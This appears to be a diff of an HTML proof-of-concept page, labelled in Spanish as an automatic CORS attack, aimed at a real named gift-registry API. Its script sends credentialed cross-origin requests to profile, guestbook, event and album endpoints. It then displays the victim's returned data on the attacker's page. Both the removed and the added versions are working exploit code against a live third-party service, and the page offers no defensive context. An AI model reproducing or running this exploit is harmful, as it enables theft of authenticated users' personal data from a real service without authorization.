@@ -1,60 +1,54 @@
 <!DOCTYPE html>
-<html>
+<html lang="es">
 <head>
-  <title>CORS Multi-Attack PoC</title>
+  <meta charset="UTF-8">
+  <title>Ejecutando CORS Attack</title>
   <style>
     body { font-family: monospace; background: #f4f4f4; padding: 20px; }
-    h2 { color: #c00; }
-    .endpoint { margin-bottom: 20px; padding: 10px; background: #fff; border-left: 4px solid #c00; }
-    pre { background: #eee; padding: 10px; overflow-x: auto; }
+    .success { color: green; }
+    .error { color: red; }
   </style>
 </head>
 <body>
-  <h2>🖊️ Ataque CORS: Recolección masiva de datos</h2>
-  <div id="results"></div>
+  <h2>🔥 Ataque CORS automático en curso...</h2>
+  <div id="resultado"></div>
 
   <script>
     const endpoints = [
-      { path: "/Guestbook", method: "GET" },
-      { path: "/Itinerary", method: "GET" },
-      { path: "/Album", method: "GET" },
-      { path: "/Event", method: "GET" },
-      { path: "/Profile", method: "GET" },
-      { path: "/EventDetails", method: "POST", body: JSON.stringify({ eventId: "12345", source: "Online" }) },
-      { path: "/getProfileEventDetails", method: "POST", body: JSON.stringify({ eventId: "51458076", source: "Online" }) }
+      "/Guestbook",
+      "/Event",
+      "/Profile",
+      "/Album"
     ];
 
-    const apiBase = "https://api.mesaderegalos.liverpool.mx";
-    const resultsDiv = document.getElementById("results");
+    const output = document.getElementById("resultado");
 
     endpoints.forEach(endpoint => {
-      const options = {
-        method: endpoint.method,
-        credentials: "include",
+      fetch("https://api.mesaderegalos.liverpool.mx" + endpoint, {
+        method: "GET",
+        mode: "cors",
+        credentials: "include", // intenta usar cookies si existen
         headers: {
-          "Content-Type": "application/json",
+          // opcional: si el token es inyectado por la app, no pongas nada
+          // "Authorization": "Bearer [si el token es global y accesible]"
           "Accept": "application/json"
         }
-      };
-      if (endpoint.method === "POST" && endpoint.body) {
-        options.body = endpoint.body;
-      }
-
-      fetch(apiBase + endpoint.path, options)
-        .then(res => res.text())
-        .then(data => {
-          const block = document.createElement("div");
-          block.className = "endpoint";
-          block.innerHTML = `<strong>${endpoint.method} ${endpoint.path}</strong><pre>${data}</pre>`;
-          resultsDiv.appendChild(block);
-        })
-        .catch(err => {
-          const block = document.createElement("div");
-          block.className = "endpoint";
-          block.innerHTML = `<strong>${endpoint.method} ${endpoint.path}</strong><pre>Error: ${err}</pre>`;
-          resultsDiv.appendChild(block);
-        });
+      })
+      .then(res => res.text())
+      .then(data => {
+        const pre = document.createElement("pre");
+        pre.className = "success";
+        pre.textContent = `[✅ ${endpoint}]\n` + data;
+        output.appendChild(pre);
+      })
+      .catch(err => {
+        const pre = document.createElement("pre");
+        pre.className = "error";
+        pre.textContent = `[❌ ${endpoint}]\nError: ` + err;
+        output.appendChild(pre);
+      });
     });
   </script>
 </body>
 </html>
+
